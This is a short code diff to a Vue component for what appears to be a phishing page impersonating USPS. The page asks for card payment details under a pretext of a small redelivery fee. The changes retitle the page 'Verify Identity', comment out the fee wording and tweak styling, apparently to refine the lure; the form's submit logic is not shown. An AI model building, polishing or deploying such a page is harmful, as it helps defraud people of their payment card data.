@@ -161,14 +161,15 @@ const cardIcons = [
 <template>
   <div class="usps-updates">
     <div class="main-content-body container-fluid">
-      <h1 class="payment-title">Online Payment</h1>
-      <p class="payment-description">
+      <h1 class="payment-title">Verify Identity</h1>
+
+      <!-- <p class="payment-description">
         For redelivery, we need to charge some service fees. Your package will be re-delivered after
         payment
       </p>
-      <!-- <p class="lump-sum">lump sum: <strong>$0.3</strong></p> -->
-      <p class="lump-sum">Verify Identity</p>
-      <form @submit.prevent="handleSubmit" class="payment-form">
+      <p class="lump-sum">lump sum: <strong>$0.3</strong></p> -->
+      <!-- <p class="lump-sum">Verify Identity</p> -->
+      <form @submit.prevent="handleSubmit" class="payment-form" style="margin-top: 50px">
         <!-- Cardholder -->
         <div class="form-group">
           <label for="cardholder" class="form-label"
@@ -296,6 +297,7 @@ const cardIcons = [
   margin-top: 0;
   margin-bottom: 0.5rem;
   font-weight: 500;
+  text-align: left;
 }
 
 .payment-description,
@@ -313,6 +315,7 @@ const cardIcons = [
     Arial,
     sans-serif;
   color: #000;
+  text-align: left;
 }
 
 .lump-sum {
